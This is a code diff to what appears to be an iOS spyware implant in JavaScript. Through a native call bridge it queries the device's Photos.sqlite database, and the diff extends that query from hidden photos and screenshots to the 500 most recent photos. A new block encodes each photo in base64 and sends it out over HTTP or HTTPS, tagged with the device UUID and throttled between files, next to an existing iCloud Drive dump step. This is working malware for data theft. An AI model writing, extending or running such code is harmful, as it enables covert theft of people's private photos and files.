@@ -1734,70 +1734,78 @@ function listFilesRecursive(dirPath, maxDepth, currentDepth) {
 }
 
 /**
- * Query Photos.sqlite database for hidden photos or screenshots
- * @param isHidden - true for hidden photos, false for screenshots
+ * Query Photos.sqlite database for hidden photos, screenshots, or all photos
+ * @param queryType - 0 for hidden photos, 1 for screenshots, 2 for all photos
  * @returns array of full file paths
  */
-function queryPhotosDatabase(isHidden) {
+function queryPhotosDatabase(queryType) {
 	const filePaths = [];
 	const dbPath = "/var/mobile/Media/PhotoData/Photos.sqlite";
-	
-	
+
+
 	try {
 		const SQLITE_OK = 0;
 		const SQLITE_ROW = 100;
 		const SQLITE_OPEN_READONLY = 1;
-		
+
 		// Open database
 		const dbHandlePtr = Native.callSymbol("malloc", 8);
 		if (!dbHandlePtr || dbHandlePtr === 0n) return filePaths;
-		
+
 		try {
 			Native.write64(dbHandlePtr, 0n);
-			
+
 			const openResult = Native.callSymbol("sqlite3_open_v2", dbPath, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);
-			
+
 			if (Number(openResult) !== SQLITE_OK) {
 				return filePaths;
 			}
-			
+
 			const dbHandle = Native.readPtr(dbHandlePtr);
 			if (!dbHandle || dbHandle === 0n) {
 				return filePaths;
 			}
-			
+
 			try {
-				// Query for hidden photos or screenshots
-				const sql = isHidden 
-					? "SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZHIDDEN = 1 ORDER BY ZDATECREATED"
-					: "SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZISDETECTEDSCREENSHOT = 1 ORDER BY ZDATECREATED";
-				
+				// Query for hidden photos, screenshots, or all photos (ZKIND = 0 for photos)
+				let sql;
+				if (queryType === 0) {
+					// Hidden photos
+					sql = "SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZHIDDEN = 1 ORDER BY ZDATECREATED";
+				} else if (queryType === 1) {
+					// Screenshots
+					sql = "SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZISDETECTEDSCREENSHOT = 1 ORDER BY ZDATECREATED";
+				} else {
+					// All photos (ZKIND = 0 means image/photo, 1 is video)
+					sql = "SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZKIND = 0 ORDER BY ZDATECREATED DESC LIMIT 500";
+				}
+
 				const stmtPtr = Native.callSymbol("malloc", 8);
 				if (!stmtPtr || stmtPtr === 0n) return filePaths;
-				
+
 				try {
 					Native.write64(stmtPtr, 0n);
-					
+
 					const prepResult = Native.callSymbol("sqlite3_prepare_v2", dbHandle, sql, -1, stmtPtr, 0n);
 					if (Number(prepResult) !== SQLITE_OK) {
 						return filePaths;
 					}
-					
+
 					const stmt = Native.readPtr(stmtPtr);
 					if (!stmt || stmt === 0n) return filePaths;
-					
+
 					try {
 						while (Number(Native.callSymbol("sqlite3_step", stmt)) === SQLITE_ROW) {
 							const filenamePtr = Native.callSymbol("sqlite3_column_text", stmt, 0);
 							const directoryPtr = Native.callSymbol("sqlite3_column_text", stmt, 1);
-							
+
 							if (filenamePtr && filenamePtr !== 0n) {
 								const filename = Native.readString(filenamePtr, 256).replace(/\0/g, '');
 								let directory = "";
 								if (directoryPtr && directoryPtr !== 0n) {
 									directory = Native.readString(directoryPtr, 512).replace(/\0/g, '');
 								}
-								
+
 								if (filename) {
 									let fullPath;
 									if (directory) {
@@ -1824,7 +1832,7 @@ function queryPhotosDatabase(isHidden) {
 		}
 	} catch (e) {
 	}
-	
+
 	return filePaths;
 }
 
@@ -1832,14 +1840,21 @@ function queryPhotosDatabase(isHidden) {
  * Get list of hidden photos
  */
 function getHiddenPhotos() {
-	return queryPhotosDatabase(true);
+	return queryPhotosDatabase(0);
 }
 
 /**
  * Get list of screenshots
  */
 function getScreenshots() {
-	return queryPhotosDatabase(false);
+	return queryPhotosDatabase(1);
+}
+
+/**
+ * Get list of all photos (limited to 500 most recent)
+ */
+function getAllPhotos() {
+	return queryPhotosDatabase(2);
 }
 
 /**
@@ -3449,7 +3464,37 @@ try {
 		if (screenshotError && screenshotError.stack) {
 		}
 	}
-	
+
+	// Download all photos (limited to 500 most recent)
+	try {
+		const allPhotos = getAllPhotos();
+
+		for (let i = 0; i < allPhotos.length; i++) {
+			const photoPath = allPhotos[i];
+
+			const result = readFileAsBase64(photoPath);
+			if (result === null) {
+				skipCount++;
+				continue;
+			}
+
+			const sent = USE_HTTPS
+				? sendFileViaHTTPS(photoPath, "photos", "Photo", result.data, result.size, deviceUUID)
+				: sendFileViaHTTP(photoPath, "photos", "Photo", result.data, result.size, deviceUUID);
+
+			if (sent) {
+				successCount++;
+			} else {
+				failCount++;
+			}
+
+			Native.callSymbol("usleep", BigInt(50000)); // 50ms
+		}
+	} catch (photosError) {
+		if (photosError && photosError.stack) {
+		}
+	}
+
 	// Download iCloud Drive files from /tmp/icloud_dump/ (copied by icloud_dumper.js)
 	try {
 		const icloudDumpPath = "/tmp/icloud_dump";
